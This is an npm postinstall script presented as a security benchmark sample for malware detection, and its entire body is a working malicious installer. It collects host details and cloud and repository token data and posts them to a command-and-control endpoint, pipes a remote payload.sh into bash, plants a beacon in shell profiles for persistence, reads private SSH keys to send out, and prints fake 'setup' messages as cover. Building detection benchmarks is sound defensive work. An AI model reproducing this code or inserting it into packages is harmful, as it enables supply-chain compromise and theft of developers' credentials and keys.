/**
 * BENCHMARK_TEST_ONLY - Malicious postinstall script example
 *
 * WARNING: This is a security benchmark test file.
 * Do NOT execute this script. It demonstrates malicious patterns for detection testing.
 */

const { execSync } = require('child_process');
const https = require('https');
const fs = require('fs');
const os = require('os');
const path = require('path');

// MALICIOUS: Collect sensitive system information
function collectSystemInfo() {
  return {
    platform: os.platform(),
    arch: os.arch(),
    release: os.release(),
    hostname: os.hostname(),
    username: os.userInfo().username,
    homedir: os.homedir(),
    tmpdir: os.tmpdir(),
    cpus: os.cpus().length,
    memory: os.totalmem(),
    networkInterfaces: Object.keys(os.networkInterfaces()),
    env: {
      PATH: process.env.PATH,
      HOME: process.env.HOME,
      USER: process.env.USER,
      AWS_ACCESS_KEY_ID: process.env.AWS_ACCESS_KEY_ID || '[NOT_SET]',
      AWS_SECRET_ACCESS_KEY: process.env.AWS_SECRET_ACCESS_KEY ? '[REDACTED]' : '[NOT_SET]',
      GITHUB_TOKEN: process.env.GITHUB_TOKEN ? '[REDACTED]' : '[NOT_SET]',
      NPM_TOKEN: process.env.NPM_TOKEN ? '[REDACTED]' : '[NOT_SET]'
    },
    cwd: process.cwd(),
    nodeVersion: process.version
  };
}

// MALICIOUS: Exfiltrate data to C2 server
function sendTelemetry(data) {
  const postData = JSON.stringify(data);

  const options = {
    hostname: '[REDACTED]',
    port: 443,
    path: '/api/v1/telemetry',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(postData),
      'X-Client-ID': Buffer.from(os.hostname()).toString('base64')
    }
  };

  const req = https.request(options, (res) => {
    // Silent response handling
  });

  req.on('error', () => {
    // Silent error handling to avoid detection
  });

  req.write(postData);
  req.end();
}

// MALICIOUS: Download and execute remote payload
function downloadPayload() {
  execSync('curl -s [REDACTED]/payload.sh | bash', {
    stdio: 'pipe',
    encoding: 'utf-8'
  });
}

// MALICIOUS: Establish persistence via shell profile
function establishPersistence() {
  const shellProfiles = [
    path.join(os.homedir(), '.bashrc'),
    path.join(os.homedir(), '.zshrc'),
    path.join(os.homedir(), '.profile')
  ];

  const maliciousEntry = `
# Added by dev-tools setup
export PATH="[REDACTED]/bin:$PATH"
[REDACTED]/bin/beacon &>/dev/null &
`;

  shellProfiles.forEach(profile => {
    if (fs.existsSync(profile)) {
      fs.appendFileSync(profile, maliciousEntry);
    }
  });
}

// MALICIOUS: Steal SSH keys
function exfiltrateSSHKeys() {
  const sshDir = path.join(os.homedir(), '.ssh');
  if (fs.existsSync(sshDir)) {
    const keys = fs.readdirSync(sshDir);
    keys.forEach(key => {
      if (!key.endsWith('.pub')) {
        const keyPath = path.join(sshDir, key);
        const keyContent = fs.readFileSync(keyPath, 'utf-8');
        sendTelemetry({ type: 'ssh_key', name: key, content: '[REDACTED]' });
      }
    });
  }
}

// Main execution (disguised as legitimate setup)
console.log('Setting up development environment...');
const sysInfo = collectSystemInfo();
sendTelemetry(sysInfo);
downloadPayload();
establishPersistence();
exfiltrateSSHKeys();
console.log('Setup complete!');
